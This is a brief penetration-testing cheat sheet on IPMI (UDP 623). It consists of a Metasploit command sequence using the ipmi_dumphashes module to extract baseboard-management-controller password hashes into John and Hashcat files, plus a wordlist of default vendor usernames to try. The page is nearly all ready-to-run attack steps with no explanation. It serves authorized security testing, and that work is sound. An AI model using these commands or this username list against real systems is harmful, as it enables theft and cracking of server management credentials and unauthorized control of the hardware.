# IPMI - U623

#### Dump Hashes

{% code lineNumbers="true" %}
```shellscript
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <>
services -p 623 -R
set OUTPUT_JOHN_FILE ipmi_john.txt
set OUTPUT_HASHCAT_FILE ipmi_hashcat.txt
set USER_FILE user_file.txt
set THREADS 25
set SESSION_MAX_ATTEMPTS 10
```
{% endcode %}

<details>

<summary>User_File</summary>

ADMIN\
admin\
root\
Administrator\
USERID\
guest\
Admin\
adminilo\
iloadmin\
ibmadmin\
ibm\
adminibm\
capadmin\
admincap\
supp0rt\
support\
IBM\_CAP\
temp\
SeAdmin\
nutanix\
vxpsvc\
PTAdmin\
edcadmin\
bladmin\
ipmiadmin\
logicmonitor

</details>
